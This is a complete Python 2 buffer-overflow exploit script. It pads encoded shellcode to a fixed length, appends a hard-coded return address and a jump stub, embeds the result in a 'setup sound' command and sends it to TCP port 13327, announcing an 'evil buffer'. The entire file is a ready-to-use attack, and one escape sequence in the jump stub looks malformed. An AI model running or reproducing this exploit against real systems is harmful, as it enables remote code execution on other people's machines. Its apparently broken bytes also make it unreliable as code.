#!/usr/bin/python

import socket
host = "127.0.0.1"

shellcode = ("\xd9\xca\xbd\xde\xa6\xb4\xda\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x14\x83\xe8\xfc\x31\x68\x15\x03\x68\x15\x3c\x53\x85\x01\x37\x7f\xb5\xf6\xe4\xea\x38\x70\xeb\x5b\x5a\x4f\x6b\xc0\xfd\x1d\x03\xf5\x01\xb3\x8f\x93\x11\xe2\x7f\xed\xf3\x6e\x19\xb5\x3e\xee\x6c\x04\xc5\x5c\x6a\x37\xa3\x6f\xf2\x74\x9c\x16\x3f\xfa\x4f\x8f\xd5\xc4\x37\xfd\xa9\x72\xb1\x05\xc1\xab\x6e\x85\x79\xdc\x5f\x0b\x10\x72\x29\x28\xb2\xd9\xa0\x4e\x82\xd5\x7f\x10")

ret = "\x97\x45\x13\x08"

crash = shellcode + "\x41" * (4368 - 105) + ret + "\x83\xC0\c0C\xFF\xE0\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*] Sending evil buffer..."
s.connect((host, 13327))
data = s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*] Payload Sent!"